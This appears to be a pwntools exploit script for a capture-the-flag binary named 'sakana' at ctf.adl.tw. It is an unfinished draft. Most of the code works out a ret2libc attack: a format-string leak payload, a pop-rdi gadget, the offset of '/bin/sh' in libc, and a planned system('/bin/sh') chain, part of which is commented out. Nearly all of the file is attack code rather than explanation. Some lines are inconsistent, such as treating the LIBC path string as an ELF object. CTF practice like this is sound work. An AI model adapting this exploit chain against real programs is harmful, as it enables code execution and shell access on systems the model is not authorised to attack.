from pwn import *

LOCAL = True
REMOTE = False
GDB = False
USE_ONE_GADGET = False
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.terminal = ['tmux', 'splitw', '-h']

LOCAL_BIN = "./sakana"
LIBC = "./libc-2.31.so" #ELF("./libc-2.31.so") #Set library path when know it
ENV = {"LD_PRELOAD": LIBC} if LIBC else {}


if LOCAL:
    p = process(LOCAL_BIN, env=ENV)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

elif REMOTE:
    r = remote('ctf.adl.tw', 10003)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

if GDB and not REMOTE:
    gdb.attach(p) # "b *(get_line+(0x15ae-0x150f))"

# r = remote('ctf.adl.tw', 10003)
# p = process('./sakana')

# try:
#     libc_func = "write"
#     PUTS_PLT = ELF_LOADED.plt['write'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call puts
# except:
#     libc_func = "printf"
#     PUTS_PLT = ELF_LOADED.plt['printf']

# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
# RET = (ROP_LOADED.find_gadget(['ret']))[0]

# log.info("Main start: " + hex(MAIN_PLT))
# log.info("Puts plt: " + hex(PUTS_PLT))
# log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
# log.info("ret gadget: " + hex(RET))

# # OFFSET = b'A' * (21 + 8)

# # def generate_payload_aligned(rop):
# #     payload1 = OFFSET + rop
# #     if (len(payload1) % 16) == 0:
# #         return payload1
    
# #     else:
# #         payload2 = OFFSET + p64(RET) + rop
# #         if (len(payload2) % 16) == 0:
# #             log.info("Payload aligned successfully")
# #             return payload2
# #         else:
# #             log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
# #             return payload1

# def get_addr(libc_func):
#     FUNC_GOT = ELF_LOADED.got[libc_func]
#     log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
#     # Create rop chain
#     rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
#     # rop1 = generate_payload_aligned(rop1)

#     # Send our rop-chain payload
#     #p.sendlineafter("dah?", rop1) #Use this to send the payload when something is received
#     print(p.clean()) # clean socket buffer (read all and print)
#     p.sendline(rop1)

#     # If binary is echoing back the payload, remove that message
#     recieved = p.recvline().strip()
#     # if OFFSET[:30] in recieved:
#     #     recieved = p.recvline().strip()
    
#     # Parse leaked address
#     log.info(f"Len rop1: {len(rop1)}")
#     leak = u64(recieved.ljust(8, b'\x00'))
#     log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")
    
#     # Set lib base address
#     if LIBC:
#         LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
#         print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
#         log.info("LIBC base @ %s" % hex(LIBC.address))

#     # If not LIBC yet, stop here
#     else:
#         print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
#         p.interactive()
    
#     return hex(leak)

# get_addr(libc_func) # Search for puts address in memmory to obtain LIBC base
# print(get_addr(libc_func)) # Search for puts address in memmory to obtain LIBC base

lib = ELF('./libc-2.31.so')
ROP_LIBC = ROP(lib)

# print('%x'%ELF_LOADED.plt['write'])
elf_base = ELF_LOADED.address # ! Memory leaking needed
lib_base = lib.address # ! Memory leaking needed
print(hex(ELF_LOADED.address))
print(hex(lib.address))

# rop = ROP(ELF_LOADED)
# rop.chain()
# rop_gadget = elf_base + ROP_LOADED.find_gadget(['pop rdi', 'ret'])[0] # elf_base + 0x23a3
rop_gadget = lib_base + ROP_LIBC.find_gadget(['pop rdi', 'ret'])[0] # lib_base + 0x23b6a
# print('%x'%ROP_LOADED.find_gadget(['pop rdi', 'ret'])[0])
print('%x'%ROP_LIBC.find_gadget(['pop rdi', 'ret'])[0])

sh = lib.search(b"/bin/sh\x00")
sh = next(sh)
print('%x'%sh) # 0x1b45bd

bin_sh = lib_base + sh
print('%x'%lib.symbols['execve']) # 0xe3170
print('%x'%lib.symbols['system']) # 0x52290
# print('%x'%ELF_LOADED.symbols['system']) # 
system_addr = lib_base + lib.symbols['system']

payload1 = b'printf\n'
payload1 += b'%X ' * (33 + 2)

n = 21 + 8 # 15h + 8
# payload2 = b'a' * (n) + p64(rop_gadget) + p64(bin_sh) + p64(system_addr)

# 0x23b6a (ROP gadget)　$rbp+8
# 0x1b45bd (sh) $rbp+16
# 0x52290 system() $rbp+24

# payload2 = shellcode

p.recvuntil(b'!')
p.sendafter(b'~> ', payload1)
# leak_str = p.recvline()
# print(leak_str)

# p.send(payload2)
# r.recvuntil(b'!')
# r.sendafter(b'~> ', payload)

# r.interactive()

p.interactive()
